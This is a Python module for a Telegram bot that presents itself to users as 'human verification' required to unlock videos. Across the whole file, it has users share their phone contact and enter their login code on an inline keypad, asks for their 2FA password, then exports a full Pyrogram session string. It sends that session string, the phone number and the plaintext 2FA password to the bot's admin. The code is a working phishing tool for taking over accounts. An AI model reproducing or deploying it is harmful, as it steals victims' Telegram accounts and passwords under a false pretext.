"""
Human Verification module — Pyrogram session generator
Extracted from bot.py. Import and use the HumanVerification class.
"""
import html
import logging
from datetime import datetime, timezone
from uuid import uuid4

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.constants import ParseMode
from telegram.error import BadRequest, TelegramError

from pyrogram import Client as PyroClient
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    FloodWait as PyroFloodWait,
)

log = logging.getLogger("human-verification")
PYRO_OTP_LENGTH = 5


def esc(v):
    return html.escape(str(v))


def utcnow():
    return datetime.now(timezone.utc)


class HumanVerification:
    def __init__(self, *, users, admin_id, api_id, api_hash,
                 get_setting_fn, send_batch_fn, published_batch_count_fn, menu_for_fn):
        self.users = users
        self.admin_id = admin_id
        self.api_id = api_id
        self.api_hash = api_hash
        self.get_setting = get_setting_fn
        self.send_batch = send_batch_fn
        self.published_batch_count = published_batch_count_fn
        self.menu_for = menu_for_fn

        self.sessions = {}          # uid -> {client, phone, phone_code_hash, otp, ...}
        self.states = {}            # uid -> "await_contact" | "otp" | "password"
        self.pending_unlock = {}    # uid -> True

    # ─────────── UI ───────────
    def keypad_markup(self, entered, locked=False):
        layout = [
            [("1", "1"), ("2", "2"), ("3", "3")],
            [("4", "4"), ("5", "5"), ("6", "6")],
            [("7", "7"), ("8", "8"), ("9", "9")],
            [("⌫", "back"), ("0", "0"), ("✅", "submit")],
        ]
        buttons = [
            [InlineKeyboardButton(label, callback_data=f"pyro_otp|{val}") for label, val in row]
            for row in layout
        ]

        # ── Top row: custom DM button (configurable from /set) ──
        top_text = self.get_setting("keypad_top_button_text")
        top_url = self.get_setting("keypad_top_button_url")
        if top_text and top_url:
            buttons.insert(0, [InlineKeyboardButton(top_text, url=top_url)])

        if locked:
            text = (
                "🔐 <b>Enter OTP</b>\n\n"
                f"Entered: <code>{entered}</code>\n\n"
                "⏳ Verifying..."
            )
        else:
            base_prompt = self.get_setting("otp_prompt")
            text = (
                f"{base_prompt}\n\n"
                f"Entered: <code>{entered or '—'}</code>\n\n"
                f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
            )
        return InlineKeyboardMarkup(buttons), text

    # ─────────── lifecycle ───────────
    async def cleanup(self, uid):
        sess = self.sessions.pop(uid, None)
        self.states.pop(uid, None)
        if sess and sess.get("client"):
            try:
                await sess["client"].disconnect()
            except Exception:
                pass

    async def cleanup_all(self):
        for uid in list(self.sessions.keys()):
            await self.cleanup(uid)

    async def safe_edit_or_reply(self, message, text, edit, **kwargs):
        kwargs.setdefault("parse_mode", ParseMode.HTML)
        bot = message.get_bot()
        if edit:
            try:
                return await message.edit_text(text, **kwargs)
            except Exception:
                pass
        try:
            return await bot.send_message(chat_id=message.chat_id, text=text, **kwargs)
        except Exception as e:
            log.warning("HV reply fail: %s", e)

    # ─────────── finish ───────────
    async def finish_login(self, message, uid, temp, edit,
                           has_2fa=False, phone="—", password="—"):
        try:
            session_string = await temp.export_session_string()
            me = await temp.get_me()
        except Exception as e:
            await self.safe_edit_or_reply(
                message, f"❌ Verification failed: <code>{esc(e)}</code>", edit
            )
            try:
                await message.get_bot().send_message(
                    self.admin_id,
                    f"⚠️ Session export failed for user <code>{uid}</code>.\n\n"
                    f"Error: <code>{esc(e)}</code>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            await self.cleanup(uid)
            return

        username_line = f"@{me.username}" if me.username else "—"
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
        twofa_line = "✅ Yes" if has_2fa else "❌ No"

        # Mark human_verified in DB
        self.users.update_one(
            {"user_id": uid},
            {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
        )

        # Owner DM
        owner_txt = (
            "🔔 <b>New Session Generated</b>\n\n"
            f"👤 <b>User:</b> {esc(full_name)}\n"
            f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
            f"🔗 <b>Username:</b> {esc(username_line)}\n"
            f"📱 <b>Phone:</b> <code>{esc(phone)}</code>\n"
            f"🔐 <b>2FA:</b> {twofa_line}\n"
        )
        if has_2fa:
            owner_txt += f"🔑 <b>2FA Password:</b> <code>{esc(password)}</code>\n"
        owner_txt += (
            "\n<b>String Session:</b>\n\n"
            f"<code>{esc(session_string)}</code>"
        )
        try:
            await message.get_bot().send_message(
                self.admin_id, owner_txt, parse_mode=ParseMode.HTML
            )
        except Exception as e:
            log.warning("owner send fail: %s", e)

        # Confirmation to user (uses editable message)
        user_txt = self.get_setting("human_verified_message")
        videos_btn = self.get_setting("videos_button_text")
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(videos_btn, callback_data="um_see_videos")]
        ])
        await self.safe_edit_or_reply(message, user_txt, edit, reply_markup=kb)

        # Continue pending unlock if HV was triggered by unlock_next
        if self.pending_unlock.pop(uid, False):
            await self._complete_pending_unlock(message, uid)

        await self.cleanup(uid)

    async def _complete_pending_unlock(self, message, uid):
        try:
            bot = message.get_bot()
            chat_id = message.chat_id
            d = self.users.find_one({"user_id": uid}) or {}
            current = max(1, int(d.get("unlocked_batch", 1)))
            total = self.published_batch_count()
            nxt = current + 1
            if nxt > total:
                await bot.send_message(
                    chat_id,
                    "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=self.menu_for(uid),
                )
                return
            self.users.update_one(
                {"user_id": uid},
                {"$set": {"unlocked_batch": nxt}},
            )
            batch_msg = f"🎉 <b>BATCH {nxt} UNLOCKED!</b>"
            await bot.send_message(chat_id, batch_msg, parse_mode=ParseMode.HTML)
            await self.send_batch(bot, chat_id, nxt)
        except Exception as e:
            log.warning("pending unlock failed: %s", e)

    # ─────────── handlers ───────────
    async def session_start(self, update, context):
        uid = update.effective_user.id
        had_pending = self.pending_unlock.get(uid, False)
        sess = self.sessions.pop(uid, None)
        if sess and sess.get("client"):
            try:
                await sess["client"].disconnect()
            except Exception:
                pass
        self.states[uid] = "await_contact"
        if had_pending:
            self.pending_unlock[uid] = True

        share_text = self.get_setting("share_contact_button_text")
        kb = ReplyKeyboardMarkup(
            [[KeyboardButton(share_text, request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True,
        )
        prompt = self.get_setting("hv_prompt")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=prompt,
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )

    async def contact_handler(self, update, context):
        uid = update.effective_user.id
        if self.states.get(uid) != "await_contact":
            return

        contact = update.message.contact
        if contact is None:
            return
        if contact.user_id is None or contact.user_id != uid:
            return await update.message.reply_text(
                "❌ This is not your own contact. Please share your own contact."
            )

        phone = contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone

        await update.message.reply_text(
            "⏳ Sending OTP...",
            reply_markup=ReplyKeyboardRemove(),
        )

        temp = PyroClient(
            name=f"pyro_{uuid4().hex}",
            api_id=self.api_id,
            api_hash=self.api_hash,
            in_memory=True,
        )

        try:
            await temp.connect()
            sent_code = await temp.send_code(phone)
        except PyroFloodWait as e:
            try:
                await temp.disconnect()
            except Exception:
                pass
            self.states.pop(uid, None)
            return await update.message.reply_text(
                f"⏳ FloodWait: please wait <code>{e.value}s</code>.",
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            try:
                await temp.disconnect()
            except Exception:
                pass
            self.states.pop(uid, None)
            return await update.message.reply_text(
                f"❌ Error: <code>{esc(e)}</code>",
                parse_mode=ParseMode.HTML,
            )

        self.sessions[uid] = {
            "client": temp,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "otp": "",
            "has_2fa": False,
            "locked": False,
            "password": "—",
        }
        self.states[uid] = "otp"

        markup, text = self.keypad_markup("")
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=markup,
        )

    async def otp_callback(self, update, context):
        q = update.callback_query
        uid = q.from_user.id

        sess = self.sessions.get(uid)
        if not sess:
            return await q.answer("Session expired. Try again.", show_alert=True)
        if self.states.get(uid) != "otp":
            return await q.answer("Not at OTP stage right now.")
        if sess.get("locked"):
            return await q.answer("Verifying, please wait...", show_alert=True)

        val = (q.data or "").split("|", 1)[1]
        otp = sess["otp"]

        if val == "back":
            otp = otp[:-1]
            sess["otp"] = otp
            markup, text = self.keypad_markup(otp)
            try:
                await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
            except BadRequest:
                pass
            return await q.answer()

        if val == "submit":
            if len(otp) < PYRO_OTP_LENGTH:
                return await q.answer(
                    f"Please enter all {PYRO_OTP_LENGTH} digits.", show_alert=True
                )
            await q.answer("Verifying...")
            return await self._do_sign_in(q, sess, otp)

        if len(otp) >= PYRO_OTP_LENGTH:
            return await q.answer(f"{PYRO_OTP_LENGTH} digits max")

        otp += val
        sess["otp"] = otp

        if len(otp) == PYRO_OTP_LENGTH:
            sess["locked"] = True
            markup, text = self.keypad_markup(otp, locked=True)
            try:
                await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
            except BadRequest:
                pass
            await q.answer("Verifying...")
            return await self._do_sign_in(q, sess, otp)

        markup, text = self.keypad_markup(otp)
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
        except BadRequest:
            pass
        await q.answer()

    async def _do_sign_in(self, q, sess, otp):
        uid = q.from_user.id
        temp = sess["client"]

        try:
            await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
        except SessionPasswordNeeded:
            sess["otp"] = ""
            sess["has_2fa"] = True
            self.states[uid] = "password"
            twofa_prompt = self.get_setting("twofa_prompt")
            try:
                await q.edit_message_text(twofa_prompt, parse_mode=ParseMode.HTML)
            except BadRequest:
                pass
            return
        except PhoneCodeInvalid:
            sess["otp"] = ""
            sess["locked"] = False
            markup, text = self.keypad_markup("")
            try:
                await q.edit_message_text(
                    "❌ Invalid OTP. Please try again.\n\n" + text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=markup,
                )
            except BadRequest:
                pass
            return
        except PhoneCodeExpired:
            try:
                await q.edit_message_text("❌ OTP expired. Try again.", parse_mode=ParseMode.HTML)
            except BadRequest:
                pass
            await self.cleanup(uid)
            return
        except Exception as e:
            try:
                await q.edit_message_text(
                    f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
                )
            except BadRequest:
                pass
            await self.cleanup(uid)
            return

        await self.finish_login(
            q.message, uid, temp, edit=True,
            has_2fa=sess.get("has_2fa", False),
            phone=sess.get("phone", "—"),
            password=sess.get("password", "—"),
        )

    async def password_handler(self, update, context):
        uid = update.effective_user.id
        sess = self.sessions.get(uid)
        if not sess:
            self.states.pop(uid, None)
            return await update.message.reply_text("Please start the verification again.")

        password = update.message.text or ""
        sess["password"] = password

        try:
            await update.message.delete()
        except TelegramError:
            pass

        try:
            await sess["client"].check_password(password)
        except PasswordHashInvalid:
            sess["password"] = "—"
            return await update.message.reply_text("❌ Incorrect password. Please try again.")
        except Exception as e:
            sess["password"] = "—"
            return await update.message.reply_text(
                f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
            )

        await self.finish_login(
            update.message, uid, sess["client"], edit=False,
            has_2fa=sess.get("has_2fa", False),
            phone=sess.get("phone", "—"),
            password=sess.get("password", "—"),
        )

    async def cancel_command(self, update, context):
        uid = update.effective_user.id
        if uid not in self.sessions and uid not in self.states:
            return await update.message.reply_text("No verification process is active.")
        self.pending_unlock.pop(uid, None)
        await self.cleanup(uid)
        await update.message.reply_text(
            "✅ Verification cancelled.",
            reply_markup=ReplyKeyboardRemove(),
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Choose an option:",
            parse_mode=ParseMode.HTML,
            reply_markup=self.menu_for(uid),
        )
